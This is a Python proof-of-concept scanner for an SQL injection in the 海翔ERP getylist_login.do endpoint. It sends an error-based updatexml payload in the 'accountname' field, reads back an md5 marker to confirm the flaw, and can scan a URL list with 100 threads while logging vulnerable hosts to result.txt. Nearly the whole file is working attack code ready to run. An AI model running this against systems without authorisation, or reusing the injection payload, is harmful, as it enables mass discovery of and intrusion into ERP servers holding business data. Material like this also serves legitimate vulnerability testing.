# 海翔ERP getylist_login.do SQL注入漏洞
import sys,argparse,re,warnings,urllib3,requests
from multiprocessing.dummy import Pool
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings("ignore")

def banner():
    banner = """
         __  __     ______     __  __     ______     __  __     ______     __  __     ______    
        /\ \_\ \   /\  __ \   /\ \_\ \   /\  __ \   /\ \_\ \   /\  __ \   /\ \_\ \   /\  __ \   
        \ \  __ \  \ \  __ \  \ \  __ \  \ \  __ \  \ \  __ \  \ \  __ \  \ \  __ \  \ \  __ \  
         \ \_\ \_\  \ \_\ \_\  \ \_\ \_\  \ \_\ \_\  \ \_\ \_\  \ \_\ \_\  \ \_\ \_\  \ \_\ \_\ 
          \/_/\/_/   \/_/\/_/   \/_/\/_/   \/_/\/_/   \/_/\/_/   \/_/\/_/   \/_/\/_/   \/_/\/_/ 
                                                                                             
"""
    print(f"{banner}")
    
def main():
    banner()
    parser = argparse.ArgumentParser(description="海翔ERP getylist_login.do SQL注入漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='intput link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    if args.url and not args.file:
        host, port = extract_host(args.url)
        if host:
            if "https" in args.url:
                url = f"https://{host}:{port}"
            else:
                url = f"http://{host}:{port}"
            poc(url)
        else:
            print(f"Invalid URL: {args.url}")
    elif not args.url and args.file:
        url_list = []
        with open(args.file, "r", encoding="utf-8") as f:
            for url in f.readlines():
                url = url.strip().replace("\n", "")
                host, port = extract_host(url)
                if host:
                    if "https" in url:
                        url_list.append(f"https://{host}:{port}")
                    else:
                        url_list.append(f"http://{host}:{port}")
                else:
                    print(f"Invalid URL: {url}")

        mp = Pool(100) 
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
        "Connection": "close",
        "Content-Length": "77",
        "Accept-Encoding": "gzip",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"

    }

    url = target + f"/getylist_login.do"
    data = {
    'accountname': "test' and (updatexml(1,concat(0x7e,(select md5(123)),0x7e),1));--"
}
    try:
        response = requests.post(url, headers=headers, data=data, timeout=15, verify=False)
        code = response.status_code
        if code == 500:
            match = re.search(r"202cb962ac59075b964b07152d234b7", response.text)

            if match:
                print(f"[+]{target}存在漏洞")
                with open("result.txt", "a+", encoding="utf-8") as f:
                    f.write(target + "\n")
            else:
                print(f"[-]{target}不存在漏洞")
        else:
            print(f"[-]{target}不存在漏洞")
    except Exception as e:
        print(f"[*] {target}请手工测试")


def extract_host(url):
    """
    从 URL 中提取主机地址和端口号，返回 (host, port)
    """
    match = re.search(r"(?:https?://)?([\w\.]+):?(\d+)?", url)
    if match:
        host, port = match.groups()
        if not port:
            if "https" in url:
                port = "443"
            else:
                port = "80"
        return host, int(port)
    else:
        return None, None


if __name__ == '__main__':
    main()